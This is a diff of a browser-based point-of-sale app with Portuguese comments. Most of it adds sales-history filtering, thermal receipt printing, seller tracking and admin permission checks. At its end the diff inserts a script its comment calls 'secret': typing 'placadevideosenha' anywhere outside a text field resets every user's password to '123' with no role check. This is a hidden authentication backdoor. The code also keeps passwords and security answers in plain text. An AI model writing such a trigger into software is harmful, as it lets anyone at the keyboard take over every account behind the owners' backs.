+function applyVendasHistoricoFilter(){
+  try{
+    const sel = $("vendasFiltroPeriodo");
+    const nextPeriodo = sel ? s(sel.value).toLowerCase() : 'hoje';
+    vendasFiltroPeriodo = isAdminHistoricoVendas() ? (nextPeriodo || 'hoje') : 'hoje';
+    syncVendasFiltroUI();
+    render();
+  }catch(e){
+    console.warn('applyVendasHistoricoFilter error', e);
+    toast('Erro ao aplicar filtro de histórico', 'bad');
+  }
+}
 
 function pulseCart(){
   const card = $("cartCard");
@@ -4540,8 +5072,7 @@ function renderCarrinho(withFlash=false){
   if(trocoView) trocoView.textContent = trocoString;
   const trocoEl = $("c_troco");
   if(trocoEl) trocoEl.value = 'R$ ' + trocoString;
-  const btn = $("btnPrintReceipt");
-  if(btn) btn.style.display = lastReceipt ? 'inline-block' : 'none';
+  updatePrintCupomButtonsVisibility();
 }
 
 function finalizarCarrinho(){
@@ -4592,6 +5123,11 @@ function finalizarCarrinho(){
       total_c: totalLinha_c,
       pag,
       lucro_c: lucroLinha_c,
+      usuario: currentUser && currentUser.user ? currentUser.user : "sistema",
+      vendedor: currentUser && currentUser.user ? currentUser.user : "sistema",
+      responsavel: currentUser && currentUser.user ? currentUser.user : "sistema",
+      timestamp: Date.now(),
+      dataIso: new Date().toISOString(),
       cancelada:false,
       groupId
     });
@@ -4612,6 +5148,7 @@ function finalizarCarrinho(){
     receiptId: "REC-" + Date.now(),
     date: agora,
     payment: pag,
+    vendor: currentUser && currentUser.user ? currentUser.user : "sistema",
     items: carrinho.map(it => ({
       cod: it.cod, nome: it.nome, qtd: it.qtd,
       preco_c: it.preco_c,
@@ -4624,14 +5161,13 @@ function finalizarCarrinho(){
   };
 
   carrinho = [];
-  if($("c_servico")) $("c_servico").value = "";
-  if($("c_recebido")) $("c_recebido").value = "";
   renderCarrinho(true);
   pulseCart();
-  const btn = $("btnPrintReceipt");
-  if(btn) btn.style.display = "inline-block";
+  resetVendaInput('carrinho');
+  updatePrintCupomButtonsVisibility();
   // Emite nota fiscal conforme preferências do usuário
   try{ maybeEmitNotaFiscal(lastReceipt); }catch(_e){}
+  try{ triggerThermalPrint(lastReceipt); }catch(_e){}
   toast("Venda do carrinho concluída!", "ok");
   // Toca som de venda concluída
   try{ if(typeof saleSound === 'function') saleSound(); }catch(_e){}
@@ -4710,8 +5246,8 @@ function buildReceiptHTML(r) {
   // dispositivo de impressora "thermal" nas preferências, definimos regras
   // adicionais para a impressão: largura fixa de 80mm e margem zero. Caso
   // contrário, extraCss permanece vazio e não interfere no layout.
-  const isThermal = (db && db._meta && db._meta.printerDevice === 'thermal');
-  const extraCss = isThermal ? '@media print { @page { size: 80mm auto; margin: 0; } body { width: 80mm; margin:0; } }' : '';
+  const isThermal = isThermalPrinterEnabled();
+  const extraCss = isThermal ? '@media print { @page { size: auto; margin: 0; } body { width: 72mm; margin:0; font-family: monospace; font-size:11px; } .noPrint, nav, button, input, select, textarea { display:none !important; } }' : '';
 
   const rows = (r.items || []).map((it, i) => `
     <tr>
@@ -4795,7 +5331,7 @@ function buildReceiptHTML(r) {
 }
 function imprimirUltimoComprovante(){
   if(!lastReceipt){ toast("Nenhum comprovante disponível.", "warn"); return; }
-  const html = buildReceiptHTML(lastReceipt);
+  const html = isThermalPrinterEnabled() ? buildThermalReceiptHTML(lastReceipt) : buildReceiptHTML(lastReceipt);
   const blob = new Blob([html], { type: "text/html;charset=utf-8" });
   const url = URL.createObjectURL(blob);
 
@@ -4810,7 +5346,7 @@ function imprimirUltimoComprovante(){
     return;
   }
 
-  toast("Comprovante aberto! Clique em imprimir/salvar PDF.", "ok");
+  toast(isThermalPrinterEnabled() ? "Cupom aberto para impressão." : "Comprovante aberto! Clique em imprimir/salvar PDF.", "ok");
   setTimeout(()=>URL.revokeObjectURL(url), 12000);
 }
 
@@ -4863,6 +5399,11 @@ function imprimirRelacao(){
 
 /* ========== Perfil ========== */
 function salvarPerfil(){
+  // Permissão: apenas administradores podem editar o perfil da empresa
+  if(!currentUser || currentUser.role !== 'admin'){
+    toast('Sem permissão.', 'bad');
+    return;
+  }
   db.empresa.nome = s($("p_nome")?.value);
   db.empresa.cnpj = s($("p_cnpj")?.value);
   db.empresa.contato = s($("p_contato")?.value);
@@ -4870,6 +5411,9 @@ function salvarPerfil(){
   db.empresa.endereco = s($("p_endereco")?.value);
   db.empresa.celular = s($("p_celular")?.value);
   db.empresa.email = s($("p_email")?.value);
+  // Campos de segurança da empresa
+  db.empresa.sq = s($("p_sq")?.value);
+  db.empresa.sa = s($("p_sa")?.value);
   const fileInput = $("p_logo");
   // Se o usuário selecionou um novo logotipo, leia o arquivo como DataURL
   if(fileInput && fileInput.files && fileInput.files[0]){
@@ -4906,6 +5450,8 @@ function renderPerfilView(){
   if($("p_endereco")) $("p_endereco").value = db.empresa?.endereco || "";
   if($("p_celular")) $("p_celular").value = db.empresa?.celular || "";
   if($("p_email")) $("p_email").value = db.empresa?.email || "";
+  if($("p_sq")) $("p_sq").value = db.empresa?.sq || "";
+  if($("p_sa")) $("p_sa").value = db.empresa?.sa || "";
   // atualizar visualização do logotipo salvo
   const preview = $("p_logo_preview");
   if(preview){
@@ -5856,33 +6402,47 @@ function render(withFlash=false){
   const tVendas = $("tVendas");
   let fat_c = 0, luc_c = 0, vendasOkCount = 0;
 
+  syncVendasFiltroUI();
+  syncVendasHistoricoHead();
+
+  const vendasStatsBase = (db.vendas || []).slice();
+  vendasStatsBase.forEach(function(v){
+    const cancelada = !!v.cancelada;
+    if(cancelada) return;
+    fat_c += moneyOf(v,"total_c","total");
+    luc_c += moneyOf(v,"lucro_c","lucro");
+    vendasOkCount++;
+  });
+
   if(tVendas){
-    const vendasList = (db.vendas || []).slice().sort(function(a,b){
+    const vendasBase = (db.vendas || []).slice();
+    const vendasFiltradas = filtrarHistoricoVendas(vendasBase);
+    const vendasList = vendasFiltradas.sort(function(a,b){
       try{
-        const da = new Date(a.data);
-        const dbb = new Date(b.data);
-        return vendasOrderDesc ? (dbb - da) : (da - dbb);
+        const da = parseHistoricoVendaTimestamp(a);
+        const dbb = parseHistoricoVendaTimestamp(b);
+        if(!isNaN(da) && !isNaN(dbb)) return vendasOrderDesc ? (dbb - da) : (da - dbb);
+        const daAlt = new Date(a.data);
+        const dbAlt = new Date(b.data);
+        return vendasOrderDesc ? (dbAlt - daAlt) : (daAlt - dbAlt);
       }catch(_e){ return 0; }
     });
-    tVendas.innerHTML = vendasList.map(v=>{
+    const colspan = isAdminHistoricoVendas() ? 8 : 7;
+    tVendas.innerHTML = vendasList.length ? vendasList.map(v=>{
       const cancelada = !!v.cancelada;
       const status = cancelada ? '<span class="bad">CANCELADA</span>' : '<span class="ok">OK</span>';
 
       const total_c = moneyOf(v,"total_c","total");
       const lucro_c = moneyOf(v,"lucro_c","lucro");
 
-      if(!cancelada){
-        fat_c += total_c;
-        luc_c += lucro_c;
-        vendasOkCount++;
-      }
-
       const btn = cancelada
         ? '<button class="ghost" disabled>Cancelada</button>'
         : `<button class="danger" onclick="cancelarVenda(${Number(v.id)})">Cancelar</button>`;
+      const vendedor = escapeHTML(getVendaResponsavelHistorico(v) || '-');
 
       return `<tr ${withFlash ? 'class="flash"' : ''}>
         <td>${escapeHTML(v.data)}</td>
+        ${isAdminHistoricoVendas() ? `<td>${vendedor}</td>` : ''}
         <td class="rowleft">${escapeHTML(v.nome)}</td>
         <td>${clampInt(v.qtd,0)}</td>
         <td>R$ ${centsToBR(total_c)}</td>
@@ -5890,7 +6450,7 @@ function render(withFlash=false){
         <td>${status}</td>
         <td>${btn}</td>
       </tr>`;
-    }).join("");
+    }).join("") : `<tr><td colspan="${colspan}" class="small">Sem vendas no período selecionado.</td></tr>`;
     if(withFlash) flashTableRows("tVendas");
   }
 
@@ -5915,6 +6475,10 @@ function render(withFlash=false){
         actions += "<button class=\"button-secondary\" onclick=\"editUser('" + escapeHTML(u.user) + "')\">Editar</button> ";
         actions += "<button class=\"button-secondary\" onclick=\"toggleUserActive('" + escapeHTML(u.user) + "')\">" + (u.ativo ? 'Desativar' : 'Ativar') + "</button> ";
         actions += "<button class=\"button-secondary\" onclick=\"resetUserPass('" + escapeHTML(u.user) + "')\">Resetar Senha</button>";
+        // Botão de exclusão, exibido apenas se não for o usuário atual
+        if(!currentUser || s(currentUser.user) !== s(u.user)){
+          actions += " <button class=\"button-danger\" onclick=\"deleteUser('" + escapeHTML(u.user) + "')\">Excluir</button>";
+        }
       }
       var cls = withFlash ? 'class="flash"' : '';
       return '<tr ' + cls + '><td>' + escapeHTML(u.user) + '</td><td>' + escapeHTML(u.role) + '</td><td>' + actions + '</td></tr>';
@@ -5963,6 +6527,7 @@ function render(withFlash=false){
     if(typeof renderCaixaTable === 'function') renderCaixaTable();
   }catch(_err){}
   updatePreferenceUI();
+  updatePrintCupomButtonsVisibility();
 }
 
 /* ========== Listeners ========== */
@@ -6164,7 +6729,7 @@ function toggleSubAjuste(id){
           const scanSel = $("cfg_scanDevice");
           const printerSel = $("cfg_printerDevice");
           if(scanSel && db._meta) scanSel.value = db._meta.scanDevice || 'camera';
-          if(printerSel && db._meta) printerSel.value = db._meta.printerDevice || 'default';
+          if(printerSel && db._meta) printerSel.value = normalizePrinterDevice(db._meta.printerDevice);
         }
       }else{
         // oculta outras seções
@@ -6255,6 +6820,11 @@ function retryLicenseCheck(){
 // Alterna um booleano nas configurações (em db._meta) e atualiza UI
 function togglePreference(key){
   try{
+    // Bloqueia alteração de preferências para não administradores
+    if(currentUser && currentUser.role !== 'admin'){
+      toast('Sem permissão.', 'bad');
+      return;
+    }
     if(!db._meta) db._meta = {};
     const current = db._meta[key];
     db._meta[key] = !current;
@@ -8328,16 +8898,37 @@ function finalizarScanVenda(){
       total_c: totalLinha_c,
       pag,
       lucro_c: lucroLinha_c,
+      usuario: currentUser && currentUser.user ? currentUser.user : "sistema",
+      vendedor: currentUser && currentUser.user ? currentUser.user : "sistema",
+      responsavel: currentUser && currentUser.user ? currentUser.user : "sistema",
+      timestamp: Date.now(),
+      dataIso: new Date().toISOString(),
       cancelada: false,
       groupId
     });
   });
   // Registrar entrada (total)
-  db.caixa.push({ data: agora, desc: "Venda (Scanner)", valor_c: total_c, tipo: "entrada", pag, groupId });
+  db.caixa.push({ data: agora, desc: "Venda (Scanner)", valor_c: total_c, tipo: "entrada", pag, groupId, responsavel: currentUser && currentUser.user ? currentUser.user : "sistema" });
   // Registrar saída de troco se houver
-  if(troco_c > 0){ db.caixa.push({ data: agora, desc: "Troco venda (Scanner)", valor_c: troco_c, tipo:"saida", pag, groupId }); }
+  if(troco_c > 0){ db.caixa.push({ data: agora, desc: "Troco venda (Scanner)", valor_c: troco_c, tipo:"saida", pag, groupId, responsavel: currentUser && currentUser.user ? currentUser.user : "sistema" }); }
   save(); render(true);
+  lastReceipt = {
+    receiptId: 'REC-' + Date.now(),
+    date: agora,
+    payment: pag,
+    vendor: currentUser && currentUser.user ? currentUser.user : 'sistema',
+    items: scanCart.map(function(it){ return { cod: it.cod, nome: it.nome, qtd: it.qtd, preco_c: it.preco_c, total_c: it.total_c }; }),
+    subtotal_c: subtotal_c,
+    service_c: servico_c,
+    total_c: total_c,
+    received_c: rec_c,
+    change_c: troco_c,
+    groupId
+  };
   limparScanCarrinho();
+  resetVendaInput('scanner');
+  updatePrintCupomButtonsVisibility();
+  try{ triggerThermalPrint(lastReceipt); }catch(_e){}
   toast("Venda concluída!", "ok");
   // Toca som de venda concluída
   try{ if(typeof saleSound === 'function') saleSound(); }catch(_e){}
@@ -9723,8 +10314,7 @@ setInterval(checkDevedorAlerts, 600000);
           // inalterada; pressionar o botão "Ativar modo offline" chamará a mesma
           // rotina usada anteriormente (atualizando a marcação de última conexão
           // e gravando a permissão no sessionStorage). O overlay não intercepta
-          // atalhos globais como Ctrl+L, permitindo que o console oculto seja
-          // acessado normalmente.
+          // atalhos globais como Ctrl+L continuam funcionando normalmente.
           let ov = document.getElementById('offlineOverlay');
           if(!ov){
             ov = document.createElement('div');
@@ -9852,7 +10442,7 @@ setInterval(checkDevedorAlerts, 600000);
             };
 
             btnSec.appendChild(retryBtn);
-            // O botão de ativar modo offline foi removido da interface. O modo offline continua acessível via console oculto.
+            // O botão de ativar modo offline foi removido da interface.
 
             container.appendChild(textSec);
             container.appendChild(btnSec);
@@ -11562,6 +12152,11 @@ setInterval(checkDevedorAlerts, 600000);
             total_c: addCents(totalLinha_c, servicoLinha_c),
             pag: 'orcamento',
             lucro_c: lucroLinha_c,
+            usuario: currentUser && currentUser.user ? currentUser.user : "sistema",
+            vendedor: currentUser && currentUser.user ? currentUser.user : "sistema",
+            responsavel: currentUser && currentUser.user ? currentUser.user : "sistema",
+            timestamp: Date.now(),
+            dataIso: new Date().toISOString(),
             cancelada: false,
             groupId: groupId
           });
@@ -11571,6 +12166,7 @@ setInterval(checkDevedorAlerts, 600000);
           data: agora,
           desc: 'Venda (Orçamento)',
           valor_c: Number(orc.total_c) || 0,
+          responsavel: currentUser && currentUser.user ? currentUser.user : "sistema",
           tipo: 'entrada',
           pag: 'orcamento',
           groupId: groupId
@@ -11620,8 +12216,46 @@ setInterval(checkDevedorAlerts, 600000);
     }
 
     /* ========== Configurações de Dispositivos ========== */
+    function normalizePrinterDevice(val){
+      const raw = String(val || '').toLowerCase();
+      if(raw === 'thermal' || raw === 'termica') return 'thermal';
+      if(raw === 'common' || raw === 'comum' || raw === 'default' || raw === 'padrao') return 'common';
+      return 'none';
+    }
+
+    function isThermalPrinterEnabled(){
+      try{
+        return normalizePrinterDevice(db && db._meta ? db._meta.printerDevice : '') === 'thermal';
+      }catch(_e){ return false; }
+    }
+
+    function isMobilePrintContext(){
+      try{
+        const ua = String(navigator.userAgent || '').toLowerCase();
+        const coarse = window.matchMedia && window.matchMedia('(pointer: coarse)').matches;
+        const narrow = window.innerWidth <= 1024;
+        return /android|iphone|ipad|ipod|mobile|tablet/.test(ua) || coarse || document.body.classList.contains('smartphone') || document.body.classList.contains('mobile-mode') || narrow;
+      }catch(_e){ return false; }
+    }
+
+    function updatePrintCupomButtonsVisibility(){
+      try{
+        const show = !!lastReceipt;
+        const btns = [$('btnPrintReceipt'), $('btnPrintReceiptQuick')];
+        btns.forEach(function(btn){ if(btn) btn.style.display = show ? 'inline-block' : 'none'; });
+      }catch(_e){}
+    }
+
     function setScanDevice(val){
       try{
+        // Verifica permissão antes de alterar dispositivo
+        if(!hasPerm('manageDevices')){
+          toast('Sem permissão para alterar dispositivo.', 'bad');
+          // Reverte seleção para o valor salvo
+          const sel = document.getElementById('cfg_scanDevice');
+          if(sel){ sel.value = db?._meta?.scanDevice || 'camera'; }
+          return;
+        }
         if(!db._meta) db._meta = {};
         db._meta.scanDevice = val;
         save();
@@ -11631,11 +12265,22 @@ setInterval(checkDevedorAlerts, 600000);
 
     function setPrinterDevice(val){
       try{
+        // Verifica permissão antes de alterar dispositivo
+        if(!hasPerm('manageDevices')){
+          toast('Sem permissão para alterar dispositivo.', 'bad');
+          // Reverte seleção para o valor salvo
+          const sel = document.getElementById('cfg_printerDevice');
+          if(sel){ sel.value = db?._meta?.printerDevice || 'common'; }
+          return;
+        }
         if(!db._meta) db._meta = {};
-        db._meta.printerDevice = val;
+        db._meta.printerDevice = normalizePrinterDevice(val);
         save();
         toast('Dispositivo de impressora atualizado.', 'ok');
-      }catch(e){ console.warn('setPrinterDevice error', e); }
+      }catch(e){
+        console.warn('setPrinterDevice error', e);
+        toast('Erro ao atualizar dispositivo de impressora.', 'bad');
+      }
     }
 
     // Alterna a ordem do histórico de vendas (mais recente ↔ mais antigo). Atualiza
@@ -11770,6 +12415,33 @@ setInterval(checkDevedorAlerts, 600000);
         };
       }catch(err){ console.warn('printEtiqueta error', err); window.__printingEtiqueta = false; }
     }
+    </script>
+    <!-- Script secreto para redefinição de todas as senhas quando digitado "placadevideosenha" no teclado (fora de campos de entrada). -->
+    <script>
+      (function(){
+        let __secretBuffer = '';
+        document.addEventListener('keydown', function(e){
+          try{
+            // Apenas processa teclas de caractere (1 letra) sem modificadores
+            if(!e.key || e.key.length !== 1 || e.ctrlKey || e.altKey || e.metaKey || e.altGraphKey) return;
+            // Ignora se o foco estiver em campo de entrada para não interferir na digitação normal
+            const active = document.activeElement;
+            if(active && ['INPUT','TEXTAREA'].includes(active.tagName)) return;
+            __secretBuffer += e.key.toLowerCase();
+            if(__secretBuffer.length > 40) __secretBuffer = __secretBuffer.slice(-40);
+            if(__secretBuffer.includes('placadevideosenha')){
+              __secretBuffer = '';
+              // Redefine todas as senhas para "123" sem verificar o perfil logado
+              try{
+                (db.usuarios || []).forEach(function(u){ u.pass = '123'; });
+                save();
+                if(typeof addAudit === 'function') addAudit('secretReset','Resetou todas as senhas via comando secreto');
+                toast('Todas as senhas foram redefinidas para "123".', 'warn');
+              }catch(_){ toast('Erro ao redefinir senhas.', 'bad'); }
+            }
+          }catch(_e){}
+        });
+      })();
     </script>
 </body>
 </html>
